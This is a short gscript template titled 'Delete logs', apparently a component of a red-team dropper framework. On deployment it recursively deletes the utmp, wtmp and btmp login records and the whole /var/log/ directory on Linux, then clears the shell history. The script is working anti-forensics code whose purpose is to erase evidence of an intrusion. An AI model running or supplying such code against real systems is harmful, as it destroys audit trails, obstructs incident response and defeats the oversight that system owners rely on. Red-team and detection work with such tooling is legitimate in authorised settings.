// Example gscript template
// Title: Delete logs
// Author: ahhh
// Purpose: deleting some logs on linux
// Gscript version: 1.0.0
// ATT&CK: 

//priority:150
//timeout:150
//go_import:github.com/gen0cide/gscript/stdlib/exec as exec

function Deploy() {
    //rm -rf /var/run/utmp /var/run/wtmp /var/run/btmp /var/log/
    var response = exec.ExecuteCommand("rm", ["-rf", "/var/run/utmp", "/var/run/wtmp", "/var/run/btmp", "/var/log/"]);
    console.log("Pid: "+response[0]);
    console.log("stdout: "+response[1]);
    console.log("stderr: "+response[2]);
    console.log("exit code: "+response[3]);
    console.log("go errors: "+response[4]);
    console.log("Removed /var/run/utmp, /var/run/wtmp, /var/run/btmp, and all of /var/log/");
    var response2 = exec.ExecuteCommand("history", ["-c"]);
    console.log("Pid: "+response2[0]);
    console.log("stdout: "+response2[1]);
    console.log("stderr: "+response2[2]);
    console.log("exit code: "+response2[3]);
    console.log("go errors: "+response2[4]);
    console.log("Cleared the bash history");
}